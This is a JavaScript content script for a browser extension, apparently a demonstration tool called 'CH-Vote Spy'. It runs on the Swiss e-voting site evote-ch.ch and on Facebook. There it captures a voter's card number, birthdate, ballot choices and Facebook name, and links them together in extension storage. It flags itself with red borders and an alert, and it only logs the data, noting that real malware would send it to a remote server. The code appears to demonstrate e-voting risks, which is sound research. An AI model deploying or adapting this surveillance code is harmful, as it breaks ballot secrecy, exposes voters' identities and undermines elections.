if (document.location.href === 'https://www.evote-ch.ch/sg') {
    console.log('[ch-vote spy: identification]');

    /**
     * Extract voter number. Return number string or null if it seems invalid.
     */
    function getVoterNumber() {
        const number = document.querySelector('#card-number').value;
        if (!!number && number.length === 16) {
            return number;
        }
        return null;
    }

    /**
     * This function is run when the "continue" button is clicked.
     */
    function onContinue() {
        const voterNumber = getVoterNumber();
        localStorage.setItem('voterNumber', voterNumber);
    }

    document.body.style.borderTop = "10px solid red";
    document.querySelector('#submitButton').addEventListener('click', onContinue);
} else if (document.location.href === 'https://www.evote-ch.ch/evoting/vote/displaySummary') {
    console.log('[ch-vote spy: summary]');

    /**
     * Extract questions and answers from voting page.
     */
    function getAnswers() {
        const answers = [];
        const items = document.querySelectorAll('#ballot .object_item');
        for (const item of items) {
            const q = item.querySelector('.object_question').innerText;
            const a = item.querySelector('.ballotChoiceBox').innerText;
            answers.push({q: q, a: a});
        }
        return answers;
    }

    /**
     * Return the birthdate if it was filled out.
     * Return null otherwise.
     */
    function getBirthdate() {
        const d = document.querySelector('#n_jour_naissance').value;
        const m = document.querySelector('#n_mois_naissance').value;
        const y = document.querySelector('#n_annee_naissance').value;
        const complete = (!!d && d.length === 2) &&
                         (!!m && m.length === 2) &&
                         (!!y && y.length === 4);
        if (complete) {
            return y + '-' + m + '-' + d;
        } else {
            return null;
        }
    }

    /**
     * Print the gathered data.
     */
    function printData(birthdate) {
        alert('CH-Vote Spy collected your voting information!');
        browser.storage.local.get().then((keys) => {
            console.log('====== START CH-VOTE SPY ======');
            console.log('Voter:');
            console.log('  Born on: ' + birthdate);
            console.log('  Voter number: ' + localStorage.getItem('voterNumber'));
            console.log('  Facebook name: "' + (keys.facebookName || 'unknown') + '"');
            console.log('Votes:');
            const answers = getAnswers();
            for (const answer of answers) {
                console.log('  ' + answer.q);
                console.log('  -> ' + answer.a);
            }
            console.log('====== END CH-VOTE SPY ======');
            console.log('(Note: At this point, a malicious script would send the data to a remote server.)');
        });
    }

    /**
     * This function is run when the birthdate fields are changed.
     */
    function onBirthdateChanged() {
        const birthdate = getBirthdate();
        if (birthdate !== null) {
            printData(birthdate);
        }
    }

    document.body.style.borderTop = "10px solid red";
    document.querySelector('#n_jour_naissance').addEventListener('change', onBirthdateChanged);
    document.querySelector('#n_mois_naissance').addEventListener('change', onBirthdateChanged);
    document.querySelector('#n_annee_naissance').addEventListener('change', onBirthdateChanged);
} else if (document.location.href === 'https://www.facebook.com/') {
    console.log('[ch-vote spy: facebook]');

    /**
     * Get the facebook name.
     */
    function getFacebookName() {
        const nameElement = document.querySelector('#userNav div.linkWrap');
        return nameElement.innerText;
    }

    document.body.style.marginTop = "40px";
    document.body.style.borderTop = "20px solid red";

    const facebookName = getFacebookName();
    console.log('Facebook name is "' + facebookName + '"');
    browser.storage.local.set({facebookName: facebookName}).then(
        () => { console.log('Stored info in extension storage'); },
        (error) => { console.log('Could not store info in extension storage: ' + error); },
    );
}
